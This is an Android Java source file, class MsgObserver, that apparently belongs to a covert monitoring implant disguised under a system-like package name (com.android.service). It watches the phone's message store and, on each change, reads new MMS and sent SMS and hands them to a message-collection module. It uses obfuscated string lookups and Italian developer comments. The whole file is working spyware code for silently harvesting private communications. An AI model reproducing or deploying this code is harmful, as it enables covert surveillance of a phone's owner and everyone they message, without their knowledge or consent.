package com.android.service.module.message;

import java.util.ArrayList;
import java.util.Iterator;

import android.content.ContentResolver;
import android.database.ContentObserver;

import android.os.Handler;
import android.os.Handler.Callback;
import android.os.Message;

import com.android.service.Messages;
import com.android.service.Status;
import com.android.service.auto.Cfg;
import com.android.service.manager.ManagerModule;
import com.android.service.module.ModuleMessage;
import com.android.service.util.Check;

public class MsgObserver extends ContentObserver implements Runnable {
	private static final String TAG = "MsgObserver"; //$NON-NLS-1$
	private boolean mmsEnabled;
	private boolean smsEnabled;

	private long changeDelay = 5000;

	public MsgObserver(Handler handler, boolean mmsEnabled, boolean smsEnabled) {
		super(handler);
		this.mmsEnabled = mmsEnabled;
		this.smsEnabled = smsEnabled;
	}

	final Handler h = new Handler(new Callback() {
		@Override
		public boolean handleMessage(Message msg) {
			actualBrowsing();
			return false;
		}
	});

	@Override
	public void onChange(boolean bSelfChange) {
		super.onChange(bSelfChange);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (onChange): preparing callback");
		}
		Handler handler = Status.self().getDefaultHandler();
		handler.removeCallbacks(this);
		handler.postDelayed(this, changeDelay);

	}

	/**
	 * Chiamato dall'handler, dopo 5 secondi.
	 */
	@Override
	public void run() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (run): callback called");
		}
		actualBrowsing();
	}

	void actualBrowsing() {
		// messages: Messages.getString("b.9");
		ModuleMessage a = (ModuleMessage) ManagerModule.self().get(Messages.getString("b.9"));

		if (a == null) {
			return;
		}

		final ContentResolver contentResolver = Status.getAppContext().getContentResolver();

		// http://stackoverflow.com/questions/3012287/how-to-read-mms-data-in-android

		// Se questa non dovesse piu andare cambiare in "content://sms"
		// ManagerModule.get("sms")
		// orig: content://sms/outbox

		/*
		 * I possibili content resolver sono Inbox = "content://sms/inbox"
		 * Failed = "content://sms/failed" Queued = "content://sms/queued" Sent
		 * = "content://sms/sent" Draft = "content://sms/draft" Outbox =
		 * "content://sms/outbox" Undelivered = "content://sms/undelivered" All
		 * = "content://sms/all" Conversations = "content://sms/conversations"
		 * All Conversations = "content://mms-sms/conversations" All messages =
		 * "content://mms-sms" All SMS = "content://sms"
		 */
		if (mmsEnabled) {
			final MmsBrowser mmsBrowser = new MmsBrowser();
			final ArrayList<Mms> listMms = mmsBrowser.getMmsList(a.getLastManagedMmsId());
			final Iterator<Mms> iterMms = listMms.listIterator();

			while (iterMms.hasNext()) {
				final Mms mms = iterMms.next();
				mms.print();
				a.notification(mms);
			}

			a.updateMarkupMMS(mmsBrowser.getMaxId());
		}

		if (smsEnabled) {
			final SmsBrowser smsBrowser = new SmsBrowser();
			final ArrayList<Sms> listSms = smsBrowser.getLastSmsSent(a.getLastManagedSmsId());
			final Iterator<Sms> iterSms = listSms.listIterator();

			while (iterSms.hasNext()) {
				final Sms sms = iterSms.next();
				sms.print();
				a.notification(sms);
			}

			a.updateMarkupSMS(smsBrowser.getMaxId());
		}
	}

}
